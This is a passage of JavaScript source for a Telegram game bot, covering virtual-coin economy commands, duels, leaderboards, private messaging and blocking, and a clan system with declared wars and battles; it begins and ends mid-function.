  const templates = ["portfolio", "business", "store"];
  const questions = {
    portfolio: ["name", "title", "bio", "skill1", "skill2", "skill3"],
    business: ["company", "tagline", "service1", "service1_desc", "service2", "service2_desc", "service3", "service3_desc"],
    store: ["store", "tagline", "product1", "product1_price", "product2", "product2_price", "product3", "product3_price"]
  };
  
  if (!template || !templates.includes(template)) {
    return sendDopeMessage(ctx, `🌐 **WEB CREATOR**\n\n/createweb portfolio\n/createweb business\n/createweb store\n💰 Cost: ${WEB_PRICE} coins`);
  }
  
  if (u.coins < WEB_PRICE) return sendDopeMessage(ctx, `❌ Need ${WEB_PRICE} coins!`);
  
  await takeCoin(ctx.from.id, WEB_PRICE);
  webBuilds.set(ctx.from.id, { template, step: 0, data: {}, questions: questions[template] });
  await sendDopeMessage(ctx, `✅ Template: ${template}\n💰 -${WEB_PRICE} coins\n\n📝 Step 1/${questions[template].length}\nSend: ${questions[template][0]}`);
});

bot.command("mywebsites", async (ctx) => {
  let websites = await Website.find({ ownerId: ctx.from.id });
  if (websites.length === 0) return sendDopeMessage(ctx, "📭 No websites yet! /createweb portfolio");
  let message = "🌐 **YOUR WEBSITES** 🌐\n\n";
  for (let site of websites) message += `📌 ${site.name}\n📅 ${new Date(site.createdAt).toLocaleDateString()}\n\n`;
  await sendDopeMessage(ctx, message);
});

// ========== 💰 ECONOMY COMMANDS ==========
bot.command("balance", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  await sendDopeMessage(ctx, `💰 **BALANCE**\n\nCoins: ${u.coins}\n💎 Diamonds: ${u.diamonds}\n📊 Level: ${u.level}\n⭐ XP: ${u.xp}/${u.level * 100}`); 
});

bot.command("daily", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let now = Date.now(); 
  if (u.lastDaily && now - u.lastDaily < 86400000) { 
    let remaining = 86400000 - (now - u.lastDaily);
    let h = Math.floor(remaining / 3600000); 
    let m = Math.floor((remaining % 3600000) / 60000);
    return sendDopeMessage(ctx, `⏰ ${h}h ${m}m left until next daily!`); 
  } 
  await addCoin(ctx.from.id, DAILY_REWARD);
  u.lastDaily = new Date(now);
  u.streak = (u.streak % 7) + 1;
  await saveUser(ctx.from.id, u);
  
  // Streak badge
  if (u.streak === 7 && !u.badges.includes("🔥 Weekly Warrior")) {
    u.badges.push("🔥 Weekly Warrior");
    await saveUser(ctx.from.id, u);
    await sendDopeMessage(ctx, `🎁 **DAILY REWARD**\n✨ +${DAILY_REWARD} COINS!\n🔥 Streak: Day ${u.streak}/7\n🏅 NEW BADGE: 🔥 Weekly Warrior!`);
  } else {
    await sendDopeMessage(ctx, `🎁 **DAILY REWARD**\n✨ +${DAILY_REWARD} COINS!\n🔥 Streak: Day ${u.streak}/7`);
  }
});

bot.command("work", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let now = Date.now(); 
  let last = workCD.get(u.userId) || 0; 
  if (now - last < 12 * 60 * 60 * 1000) { 
    let h = Math.floor((12 * 60 * 60 * 1000 - (now - last)) / 3600000); 
    return sendDopeMessage(ctx, `⏰ ${h}h left until you can work again!`); 
  } 
  let jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Tester", "📊 Analyst", "🕵️ Hacker", "👨‍💻 Coder", "🔧 Engineer", "📈 Trader", "🎬 Editor"]; 
  let job = jobs[Math.floor(Math.random() * jobs.length)]; 
  await addCoin(u.userId, WORK_REWARD);
  workCD.set(u.userId, now); 
  await sendDopeMessage(ctx, `💼 Worked as ${job}!\n+${WORK_REWARD} coins`); 
});

bot.command("gift", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 3) return sendDopeMessage(ctx, "❌ Usage: /gift @username amount");
  
  let targetName = args[1].replace("@", "");
  let amount = parseInt(args[2]);
  let sender = await initUser(ctx.from.id);
  
  if (isNaN(amount) || amount < 1) return sendDopeMessage(ctx, "❌ Invalid amount!");
  if (sender.coins < amount) return sendDopeMessage(ctx, `❌ You only have ${sender.coins} coins!`);
  if (ctx.from.id.toString() === targetName) return sendDopeMessage(ctx, "❌ Can't gift yourself!");
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let chat = await ctx.telegram.getChat(id);
      if (chat.username === targetName) { targetId = id; break; }
    } catch(e) {}
  }
  
  if (!targetId) return sendDopeMessage(ctx, "❌ User not found!");
  
  await takeCoin(ctx.from.id, amount);
  await addCoin(targetId, amount);
  await addXP(ctx.from.id, 2);
  
  // Gift badge
  let senderUser = await initUser(ctx.from.id);
  if (!senderUser.badges.includes("🎁 Generous")) {
    senderUser.badges.push("🎁 Generous");
    await saveUser(ctx.from.id, senderUser);
  }
  
  await sendDopeMessage(ctx, `🎁 **GIFT SENT!**\n\n📤 To: @${targetName}\n💰 Amount: ${amount} coins\n💸 Your balance: ${sender.coins - amount}`);
  await ctx.telegram.sendMessage(targetId, `🎁 **GIFT RECEIVED!**\n\n👤 From: @${ctx.from.username}\n💰 +${amount} COINS!`);
});

bot.command("duel", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 3) return sendDopeMessage(ctx, "❌ Usage: /duel @username amount");
  
  let targetName = args[1].replace("@", "");
  let bet = parseInt(args[2]);
  let challenger = await initUser(ctx.from.id);
  
  if (isNaN(bet) || bet < 10) return sendDopeMessage(ctx, "❌ Min bet 10 coins!");
  if (challenger.coins < bet) return sendDopeMessage(ctx, `❌ You need ${bet} coins!`);
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let chat = await ctx.telegram.getChat(id);
      if (chat.username === targetName) { targetId = id; break; }
    } catch(e) {}
  }
  
  if (!targetId) return sendDopeMessage(ctx, "❌ User not found!");
  if (targetId === ctx.from.id) return sendDopeMessage(ctx, "❌ Can't duel yourself!");
  
  let target = await initUser(targetId);
  if (target.coins < bet) return sendDopeMessage(ctx, `❌ @${targetName} doesn't have ${bet} coins!`);
  
  duelChallenges.set(targetId, { from: ctx.from.id, bet: bet, status: "waiting" });
  setTimeout(() => duelChallenges.delete(targetId), 60000);
  
  await sendDopeMessage(ctx, `⚔️ **DUEL CHALLENGE SENT!**\n\n🎯 Target: @${targetName}\n💰 Bet: ${bet} coins\n\nWaiting for response...`);
  await ctx.telegram.sendMessage(targetId, `⚔️ **DUEL CHALLENGE!**\n\n👤 From: @${ctx.from.username}\n💰 Bet: ${bet} coins\n\nType /acceptduel to fight!`);
});

bot.command("acceptduel", async (ctx) => {
  let challenge = duelChallenges.get(ctx.from.id);
  if (!challenge || challenge.status !== "waiting") return sendDopeMessage(ctx, "❌ No active duel challenge!");
  
  let accepter = await initUser(ctx.from.id);
  let challenger = await initUser(challenge.from);
  
  if (accepter.coins < challenge.bet) return sendDopeMessage(ctx, `❌ You need ${challenge.bet} coins to accept!`);
  
  await takeCoin(ctx.from.id, challenge.bet);
  await takeCoin(challenge.from, challenge.bet);
  
  // Fight simulation
  let challengerPower = challenger.level + (challenger.wins * 0.1);
  let accepterPower = accepter.level + (accepter.wins * 0.1);
  let challengerChance = challengerPower / (challengerPower + accepterPower);
  let winner = Math.random() < challengerChance ? challenge.from : ctx.from.id;
  let loser = winner === ctx.from.id ? challenge.from : ctx.from.id;
  
  await addCoin(winner, challenge.bet * 2);
  await addXP(winner, 15);
  await addXP(loser, 5);
  
  let winnerUser = await initUser(winner);
  winnerUser.wins = (winnerUser.wins || 0) + 1;
  await saveUser(winner, winnerUser);
  
  let loserUser = await initUser(loser);
  loserUser.losses = (loserUser.losses || 0) + 1;
  await saveUser(loser, loserUser);
  
  duelChallenges.delete(ctx.from.id);
  
  await ctx.telegram.sendMessage(winner, `🎉 **YOU WON THE DUEL!**\n💰 +${challenge.bet * 2} COINS!\n✨ +15 XP`);
  await ctx.telegram.sendMessage(loser, `💀 **YOU LOST THE DUEL!**\n💰 -${challenge.bet} COINS`);
});

// ========== 🏆 LEADERBOARD ==========
bot.command("leaderboard", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => b.coins - a.coins).slice(0, 15);
  let lines = ["🏆 **TOP 15 RICHEST** 🏆", ""];
  
  for (let i = 0; i < sorted.length; i++) {
    let name = await getUsername(sorted[i].userId);
    name = name.replace(/[^a-zA-Z0-9_]/g, '').substring(0, 20);
    let medal = i === 0 ? "👑" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    lines.push(`${medal} ${i+1}. @${name} | ${sorted[i].coins} coins | Lvl ${sorted[i].level}`);
  }
  await ctx.reply(lines.join("\n"), { parse_mode: undefined });
});

bot.command("topwords", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => (b.wordWins || 0) - (a.wordWins || 0)).slice(0, 10);
  let lines = ["📝 **TOP WORD WARRIORS** 📝", ""];
  
  for (let i = 0; i < sorted.length; i++) {
    let name = await getUsername(sorted[i].userId);
    name = name.replace(/[^a-zA-Z0-9_]/g, '').substring(0, 20);
    lines.push(`${i+1}. @${name} | ${sorted[i].wordWins || 0} wins`);
  }
  await ctx.reply(lines.join("\n"), { parse_mode: undefined });
});

// ========== 🎁 REDEEM & REFERRAL ==========
bot.command("redeem", async (ctx) => { 
  let args = ctx.message.text.split(" "); 
  if (args.length < 2) return sendDopeMessage(ctx, "❌ Usage: /redeem CODE"); 
  let res = await redeemCode(ctx.from.id, args[1]); 
  await sendDopeMessage(ctx, res.msg); 
});

bot.command("referral", async (ctx) => {
  let user = await initUser(ctx.from.id);
  await sendDopeMessage(ctx, `🔗 **YOUR REFERRAL LINK**\n\n${refLink(ctx.from.id)}\n\n💰 +${REF_REWARD} COINS per referral!\n👥 Total referrals: ${user.referrals}`);
});

// ========== 💬 CHAT SYSTEM ==========
bot.command("msg", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 3) return sendDopeMessage(ctx, "❌ Usage: /msg @username [message]");
  
  let targetName = args[1].replace("@", "");
  let message = args.slice(2).join(" ");
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let chat = await ctx.telegram.getChat(id);
      if (chat.username === targetName) { targetId = id; break; }
    } catch(e) {}
  }
  
  if (!targetId) return sendDopeMessage(ctx, "❌ User not found!");
  if (targetId === ctx.from.id) return sendDopeMessage(ctx, "❌ Can't message yourself!");
  
  let target = usersCache.get(targetId);
  if (target?.blockedUsers?.includes(ctx.from.id)) {
    return sendDopeMessage(ctx, "❌ You are blocked by this user!");
  }
  
  let sender = await initUser(ctx.from.id);
  let msg = {
    from: ctx.from.id,
    fromName: sender.displayName || ctx.from.username,
    message: message,
    date: new Date(),
    read: false
  };
  
  if (!target.inbox) target.inbox = [];
  target.inbox.push(msg);
  await saveUser(targetId, target);
  
  await ctx.telegram.sendMessage(targetId, `💬 **NEW MESSAGE**\n\nFrom: @${ctx.from.username}\n\n📝 ${message}`);
  await sendDopeMessage(ctx, `✅ Message sent to @${targetName}!`);
});

bot.command("inbox", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.inbox || user.inbox.length === 0) return sendDopeMessage(ctx, "📭 Your inbox is empty!");
  
  let messages = user.inbox.slice(-10).reverse();
  let text = "📬 **YOUR INBOX**\n\n";
  for (let msg of messages) {
    let fromName = msg.fromName || await getUsername(msg.from);
    text += `👤 ${fromName}\n📝 ${msg.message}\n🕐 ${new Date(msg.date).toLocaleString()}\n\n`;
  }
  await sendDopeMessage(ctx, text);
});

bot.command("block", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 2) return sendDopeMessage(ctx, "❌ Usage: /block @username");
  
  let targetName = args[1].replace("@", "");
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let chat = await ctx.telegram.getChat(id);
      if (chat.username === targetName) { targetId = id; break; }
    } catch(e) {}
  }
  
  if (!targetId) return sendDopeMessage(ctx, "❌ User not found!");
  
  let user = await initUser(ctx.from.id);
  if (!user.blockedUsers.includes(targetId)) {
    user.blockedUsers.push(targetId);
    await saveUser(ctx.from.id, user);
    await sendDopeMessage(ctx, `🚫 Blocked @${targetName}!`);
  } else {
    await sendDopeMessage(ctx, `Already blocked!`);
  }
});

// ========== 🏰 CLAN SYSTEM WITH WARS ==========
bot.command("clan", async (ctx) => {
  await sendDopeMessage(ctx,
    `🏰 **CLAN SYSTEM** 🏰\n\n` +
    `📋 **BASIC COMMANDS:**\n` +
    `/clan create [name] - Create clan (${CLAN_COST} coins)\n` +
    `/clan join [name] - Join a clan\n` +
    `/clan leave - Leave your clan\n` +
    `/clan info - Your clan info\n` +
    `/clan members - List members\n` +
    `/clan donate [amount] - Donate coins\n` +
    `/clan leaderboard - Top clans\n\n` +
    `⚔️ **WAR COMMANDS:**\n` +
    `/clan war [clan] [bet] - Declare war (min ${WAR_MIN_BET})\n` +
    `/clan acceptwar - Accept war challenge\n` +
    `/clan fight - Fight in active war\n` +
    `/clan warstats - Clan war stats\n\n` +
    `👑 **LEADER COMMANDS:**\n` +
    `/clan kick [@user] - Kick member\n` +
    `/clan promote [@user] - Promote to co-leader\n` +
    `/clan demote [@user] - Demote from co-leader`);
});

bot.command("clan create", async (ctx) => {
  let args = ctx.message.text.split(" ").slice(2).join(" ");
  if (!args) return sendDopeMessage(ctx, "❌ Usage: /clan create [name]");
  
  let user = await initUser(ctx.from.id);
  if (user.clan) return sendDopeMessage(ctx, "❌ You're already in a clan! Leave first.");
  if (user.coins < CLAN_COST) return sendDopeMessage(ctx, `❌ Need ${CLAN_COST} coins to create a clan!`);
  if (clansCache.has(args)) return sendDopeMessage(ctx, "❌ Clan name already taken!");
  
  await takeCoin(ctx.from.id, CLAN_COST);
  
  let clan = {
    name: args,
    tag: args.substring(0, 4).toUpperCase(),
    leaderId: ctx.from.id,
    coLeaders: [],
    members: [ctx.from.id],
    coins: 0,
    xp: 0,
    level: 1,
    wars: { wins: 0, losses: 0 },
    createdAt: new Date()
  };
  
  await saveClan(args, clan);
  user.clan = args;
  user.clanRank = "Leader";
  // Add clan founder badge
  if (!user.badges.includes("🏰 Clan Founder")) {
    user.badges.push("🏰 Clan Founder");
  }
  await saveUser(ctx.from.id, user);
  
  await sendDopeMessage(ctx, `🏰 **CLAN CREATED!**\n\nName: ${args}\nTag: ${clan.tag}\n💰 Cost: -${CLAN_COST} coins\n👑 You are the Leader!\n🏅 New badge: 🏰 Clan Founder`);
});

bot.command("clan join", async (ctx) => {
  let args = ctx.message.text.split(" ").slice(2).join(" ");
  if (!args) return sendDopeMessage(ctx, "❌ Usage: /clan join [name]");
  
  let user = await initUser(ctx.from.id);
  if (user.clan) return sendDopeMessage(ctx, "❌ You're already in a clan! Leave first.");
  
  let clan = clansCache.get(args);
  if (!clan) return sendDopeMessage(ctx, "❌ Clan not found!");
  
  clan.members.push(ctx.from.id);
  user.clan = args;
  user.clanRank = "Member";
  
  await saveClan(args, clan);
  await saveUser(ctx.from.id, user);
  
  await sendDopeMessage(ctx, `✅ Joined clan: **${args}**!`);
  await ctx.telegram.sendMessage(clan.leaderId, `👤 New member joined ${clan.name}: @${ctx.from.username}`);
});

bot.command("clan leave", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendDopeMessage(ctx, "❌ You're not in a clan!");
  
  let clan = clansCache.get(user.clan);
  if (clan) {
    clan.members = clan.members.filter(id => id !== ctx.from.id);
    if (clan.leaderId === ctx.from.id && clan.members.length > 0) {
      clan.leaderId = clan.members[0];
      await saveClan(user.clan, clan);
      let newLeader = usersCache.get(clan.leaderId);
      if (newLeader) {
        newLeader.clanRank = "Leader";
        await saveUser(clan.leaderId, newLeader);
        await ctx.telegram.sendMessage(clan.leaderId, `👑 You are now the leader of ${user.clan}!`);
      }
    } else if (clan.members.length === 0) {
      clansCache.delete(user.clan);
      await Clan.deleteOne({ name: user.clan });
    } else {
      await saveClan(user.clan, clan);
    }
  }
  
  user.clan = null;
  user.clanRank = "Member";
  await saveUser(ctx.from.id, user);
  
  await sendDopeMessage(ctx, `✅ Left clan!`);
});

bot.command("clan info", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendDopeMessage(ctx, "❌ You're not in a clan!");
  
  let clan = clansCache.get(user.clan);
  if (!clan) return sendDopeMessage(ctx, "❌ Clan not found!");
  
  let leader = await getUsername(clan.leaderId);
  let levelBar = "█".repeat(Math.floor((clan.xp / (clan.level * 1000)) * 10)) + "░".repeat(10 - Math.floor((clan.xp / (clan.level * 1000)) * 10));
  
  await sendDopeMessage(ctx,
    `🏰 **CLAN: ${clan.name}** 🏰\n\n` +
    `🏷️ Tag: ${clan.tag}\n` +
    `👑 Leader: @${leader}\n` +
    `👥 Members: ${clan.members.length}\n` +
    `💰 Clan Bank: ${clan.coins} coins\n` +
    `📊 Level: ${clan.level}\n` +
    `[${levelBar}] ${Math.floor((clan.xp / (clan.level * 1000)) * 100)}%\n` +
    `⚔️ Wars: ${clan.wars.wins}W - ${clan.wars.losses}L\n` +
    `📅 Created: ${new Date(clan.createdAt).toLocaleDateString()}`);
});

bot.command("clan members", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendDopeMessage(ctx, "❌ You're not in a clan!");
  
  let clan = clansCache.get(user.clan);
  if (!clan) return sendDopeMessage(ctx, "❌ Clan not found!");
  
  let membersList = [];
  for (let id of clan.members) {
    let username = await getUsername(id);
    let rank = id === clan.leaderId ? "👑 Leader" : clan.coLeaders.includes(id) ? "⭐ Co-Leader" : "👤 Member";
    membersList.push(`${rank} @${username}`);
  }
  
  await sendDopeMessage(ctx, `🏰 **${clan.name} MEMBERS (${clan.members.length})** 🏰\n\n${membersList.join("\n")}`);
});

bot.command("clan donate", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let amount = parseInt(args[2]);
  if (isNaN(amount) || amount < 1) return sendDopeMessage(ctx, "❌ Usage: /clan donate [amount]");
  
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendDopeMessage(ctx, "❌ You're not in a clan!");
  if (user.coins < amount) return sendDopeMessage(ctx, `❌ You only have ${user.coins} coins!`);
  
  let clan = clansCache.get(user.clan);
  if (!clan) return sendDopeMessage(ctx, "❌ Clan not found!");
  
  await takeCoin(ctx.from.id, amount);
  clan.coins += amount;
  clan.xp += Math.floor(amount / 10);
  
  // Level up clan
  let needed = clan.level * 1000;
  if (clan.xp >= needed) {
    clan.xp -= needed;
    clan.level++;
    await ctx.telegram.sendMessage(clan.leaderId, `🏰 **CLAN LEVEL UP!** ${clan.name} is now level ${clan.level}!`);
  }
  
  await saveClan(user.clan, clan);
  await sendDopeMessage(ctx, `💰 Donated ${amount} coins to ${clan.name}! +${Math.floor(amount/10)} clan XP`);
});

bot.command("clan leaderboard", async (ctx) => {
  let sorted = Array.from(clansCache.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
  let lines = ["🏆 **TOP 10 CLANS** 🏆", ""];
  
  for (let i = 0; i < sorted.length; i++) {
    let medal = i === 0 ? "👑" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    lines.push(`${medal} ${i+1}. ${sorted[i].name} | ${sorted[i].coins} coins | Lvl ${sorted[i].level} | ${sorted[i].members.length} members`);
  }
  await ctx.reply(lines.join("\n"), { parse_mode: "Markdown" });
});

bot.command("clan kick", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let username = args[2]?.replace("@", "");
  if (!username) return sendDopeMessage(ctx, "❌ Usage: /clan kick @username");
  
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendDopeMessage(ctx, "❌ You're not in a clan!");
  
  let clan = clansCache.get(user.clan);
  if (!clan) return sendDopeMessage(ctx, "❌ Clan not found!");
  if (clan.leaderId !== ctx.from.id && !clan.coLeaders.includes(ctx.from.id)) {
    return sendDopeMessage(ctx, "❌ Only Leader or Co-Leader can kick!");
  }
  if (clan.leaderId === ctx.from.id && username === (await getUsername(ctx.from.id))) {
    return sendDopeMessage(ctx, "❌ Leader cannot kick themselves! Use /clan leave instead.");
  }
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let chat = await ctx.telegram.getChat(id);
      if (chat.username === username) { targetId = id; break; }
    } catch(e) {}
  }
  
  if (!targetId) return sendDopeMessage(ctx, "❌ User not found!");
  if (targetId === clan.leaderId) return sendDopeMessage(ctx, "❌ Cannot kick the leader!");
  
  clan.members = clan.members.filter(id => id !== targetId);
  clan.coLeaders = clan.coLeaders.filter(id => id !== targetId);
  await saveClan(user.clan, clan);
  
  let target = usersCache.get(targetId);
  if (target) {
    target.clan = null;
    target.clanRank = "Member";
    await saveUser(targetId, target);
    await ctx.telegram.sendMessage(targetId, `🚫 You were kicked from ${clan.name}!`);
  }
  
  await sendDopeMessage(ctx, `✅ Kicked @${username} from the clan!`);
});

bot.command("clan promote", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let username = args[2]?.replace("@", "");
  if (!username) return sendDopeMessage(ctx, "❌ Usage: /clan promote @username");
  
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendDopeMessage(ctx, "❌ You're not in a clan!");
  
  let clan = clansCache.get(user.clan);
  if (!clan) return sendDopeMessage(ctx, "❌ Clan not found!");
  if (clan.leaderId !== ctx.from.id) return sendDopeMessage(ctx, "❌ Only Leader can promote!");
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let chat = await ctx.telegram.getChat(id);
      if (chat.username === username) { targetId = id; break; }
    } catch(e) {}
  }
  
  if (!targetId) return sendDopeMessage(ctx, "❌ User not found!");
  if (!clan.members.includes(targetId)) return sendDopeMessage(ctx, "❌ User not in your clan!");
  if (clan.coLeaders.includes(targetId)) return sendDopeMessage(ctx, "❌ User is already a Co-Leader!");
  
  clan.coLeaders.push(targetId);
  await saveClan(user.clan, clan);
  
  let target = usersCache.get(targetId);
  if (target) {
    target.clanRank = "Co-Leader";
    await saveUser(targetId, target);
    await ctx.telegram.sendMessage(targetId, `⭐ You have been promoted to Co-Leader of ${clan.name}!`);
  }
  
  await sendDopeMessage(ctx, `✅ Promoted @${username} to Co-Leader!`);
});

bot.command("clan demote", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let username = args[2]?.replace("@", "");
  if (!username) return sendDopeMessage(ctx, "❌ Usage: /clan demote @username");
  
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendDopeMessage(ctx, "❌ You're not in a clan!");
  
  let clan = clansCache.get(user.clan);
  if (!clan) return sendDopeMessage(ctx, "❌ Clan not found!");
  if (clan.leaderId !== ctx.from.id) return sendDopeMessage(ctx, "❌ Only Leader can demote!");
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let chat = await ctx.telegram.getChat(id);
      if (chat.username === username) { targetId = id; break; }
    } catch(e) {}
  }
  
  if (!targetId) return sendDopeMessage(ctx, "❌ User not found!");
  if (!clan.coLeaders.includes(targetId)) return sendDopeMessage(ctx, "❌ User is not a Co-Leader!");
  
  clan.coLeaders = clan.coLeaders.filter(id => id !== targetId);
  await saveClan(user.clan, clan);
  
  let target = usersCache.get(targetId);
  if (target) {
    target.clanRank = "Member";
    await saveUser(targetId, target);
    await ctx.telegram.sendMessage(targetId, `📉 You have been demoted to Member of ${clan.name}!`);
  }
  
  await sendDopeMessage(ctx, `✅ Demoted @${username} from Co-Leader!`);
});

// ========== ⚔️ CLAN WAR SYSTEM ==========
bot.command("clan war", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 4) return sendDopeMessage(ctx, "❌ Usage: /clan war [clan name] [bet amount]");
  
  let targetClanName = args[2];
  let bet = parseInt(args[3]);
  
  if (isNaN(bet) || bet < WAR_MIN_BET) return sendDopeMessage(ctx, `❌ Min war bet ${WAR_MIN_BET} coins!`);
  
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendDopeMessage(ctx, "❌ You're not in a clan!");
  if (user.clanRank !== "Leader" && !user.clan?.coLeaders?.includes(ctx.from.id)) {
    return sendDopeMessage(ctx, "❌ Only Leader or Co-Leader can declare war!");
  }
  
  let attackerClan = clansCache.get(user.clan);
  if (!attackerClan) return sendDopeMessage(ctx, "❌ Your clan not found!");
  if (attackerClan.coins < bet) return sendDopeMessage(ctx, `❌ Your clan bank only has ${attackerClan.coins} coins! Need ${bet} for war!`);
  
  let defenderClan = clansCache.get(targetClanName);
  if (!defenderClan) return sendDopeMessage(ctx, "❌ Target clan not found!");
  if (defenderClan.name === attackerClan.name) return sendDopeMessage(ctx, "❌ Can't declare war on yourself!");
  
  // Check if already at war
  for (let [id, war] of warsCache) {
    if ((war.clan1 === attackerClan.name || war.clan2 === attackerClan.name) && war.status === "active") {
      return sendDopeMessage(ctx, "❌ Your clan is already in an active war!");
    }
  }
  
  let warId = crypto.randomBytes(8).toString("hex");
  let war = {
    id: warId,
    clan1: attackerClan.name,
    clan2: defenderClan.name,
    bet: bet,
    status: "waiting",
    winner: null,
    battles: [],
    createdAt: new Date(),
    expiresAt: new Date(Date.now() + 30 * 60 * 1000) // 30 min to accept
  };
  
  await saveWar(warId, war);
  activeWars.set(warId, war);
  
  // Take bet from attacker clan
  attackerClan.coins -= bet;
  await saveClan(attackerClan.name, attackerClan);
  
  await sendDopeMessage(ctx, `⚔️ **WAR DECLARED!** ⚔️\n\n🏰 ${attackerClan.name} vs 🏰 ${defenderClan.name}\n💰 Bet: ${bet} coins\n⏰ Defender has 30 minutes to accept!\n\nWaiting for ${defenderClan.name} to accept...`);
  
  await ctx.telegram.sendMessage(defenderClan.leaderId, `⚔️ **WAR CHALLENGE!** ⚔️\n\n🏰 ${attackerClan.name} has declared war on ${defenderClan.name}!\n💰 Bet: ${bet} coins\n\nType /clan acceptwar to accept the challenge!`);
});

bot.command("clan acceptwar", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendDopeMessage(ctx, "❌ You're not in a clan!");
  if (user.clanRank !== "Leader") return sendDopeMessage(ctx, "❌ Only Clan Leader can accept war!");
  
  let defenderClan = clansCache.get(user.clan);
  if (!defenderClan) return sendDopeMessage(ctx, "❌ Clan not found!");
  
  // Find pending war where this clan is defender
  let pendingWar = null;
  for (let [id, war] of warsCache) {
    if (war.clan2 === defenderClan.name && war.status === "waiting") {
      pendingWar = war;
      break;
    }
  }
  
  if (!pendingWar) return sendDopeMessage(ctx, "❌ No pending war challenges for your clan!");
  if (Date.now() > pendingWar.expiresAt) {
    warsCache.delete(pendingWar.id);
    await War.deleteOne({ id: pendingWar.id });
    return sendDopeMessage(ctx, "❌ War challenge expired!");
  }
  
  if (defenderClan.coins < pendingWar.bet) {
    return sendDopeMessage(ctx, `❌ Your clan bank only has ${defenderClan.coins} coins! Need ${pendingWar.bet} to accept war!`);
  }
  
  // Take bet from defender clan
  defenderClan.coins -= pendingWar.bet;
  await saveClan(defenderClan.name, defenderClan);
  
  pendingWar.status = "active";
  pendingWar.battles = [];
  await saveWar(pendingWar.id, pendingWar);
  warsCache.set(pendingWar.id, pendingWar);
  
  await sendDopeMessage(ctx, `⚔️ **WAR ACCEPTED!** ⚔️\n\n🏰 ${pendingWar.clan1} vs 🏰 ${pendingWar.clan2}\n💰 Total Pot: ${pendingWar.bet * 2} coins!\n\nClan members can now use /clan fight to battle!\nEach win gives points!`);
  
  await ctx.telegram.sendMessage(pendingWar.clan1, `⚔️ **WAR STARTED!** ${defenderClan.name} accepted the challenge!\nUse /clan fight to battle for your clan!`);
});

bot.command("clan fight", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.clan) return sendDopeMessage(ctx, "❌ You're not in a clan!");
  
  // Find active war for this clan
  let activeWar = null;
  for (let [id, war] of warsCache) {
    if ((war.clan1 === user.clan || war.clan2 === user.clan) && war.status === "active") {
      activeWar = war;
      break;
    }
  }
  
  if (!activeWar) return sendDopeMessage(ctx, "❌ Your clan is not in an active war!\nStart one with /clan war");
  
  // Find opponent in war
  let opponentClan = activeWar.clan1 === user.clan ? activeWar.clan2 : activeWar.clan1;
  
  // Check if user already fought in this war
  let alreadyFought = activeWar.battles.some(b => b.fighterId === ctx.from.id);
  if (alreadyFought) return sendDopeMessage(ctx, "❌ You already fought in this war! Each member can fight once.");
  
  // Random battle outcome
  let winChance = 0.5 + (user.level * 0.01);
  let isWin = Math.random() < winChance;
  
  let battleResult = {
    fighterId: ctx.from.id,
    fighterName: user.displayName || ctx.from.username,
    clan: user.clan,
    won: isWin,
    timestamp: new Date()
  };
  
  activeWar.battles.push(battleResult);
  await saveWar(activeWar.id, activeWar);
  warsCache.set(activeWar.id, activeWar);
  
  let clan1Wins = activeWar.battles.filter(b => b.clan === activeWar.clan1 && b.won).length;
  let clan2Wins = activeWar.battles.filter(b => b.clan === activeWar.clan2 && b.won).length;
  
  if (isWin) {
    await addXP(ctx.from.id, 20);
    await sendDopeMessage(ctx, `⚔️ **BATTLE VICTORY!** ⚔️\n\nYou defeated a warrior from ${opponentClan}!\n✨ +20 XP for your clan!\n\n🏆 Current Score:\n${activeWar.clan1}: ${clan1Wins} wins\n${activeWar.clan2}: ${clan2Wins} wins`);
  } else {
    await addXP(ctx.from.id, 5);
    await sendDopeMessage(ctx, `⚔️ **BATTLE LOSS!** ⚔️\n\nYou were defeated by ${opponentClan}!\n✨ +5 XP for trying!\n\n🏆 Current Score:\n${activeWar.clan1}: ${clan1Wins} wins\n${activeWar.clan2}: ${clan2Wins} wins`);
  }
  
  // Check if war is over (all members fought or one side has 5 win lead)
  let attackerClan = clansCache.get(activeWar.clan1);
  let defenderClan = clansCache.get(activeWar.clan2);
  let totalFights = activeWar.battles.length;
  let maxFights = Math.min(attackerClan?.members.length || 10, defenderClan?.members.length || 10) * 2;
  
  if (Math.abs(clan1Wins - clan2Wins) >= 5 || totalFights >= maxFights) {
    let winner = clan1Wins > clan2Wins ? activeWar.clan1 : activeWar.clan2;
    let loser = winner === activeWar.clan1 ? activeWar.clan2 : activeWar.clan1;
    let pot = activeWar.bet * 2;
    
    activeWar.status = "completed";
    activeWar.winner = winner;
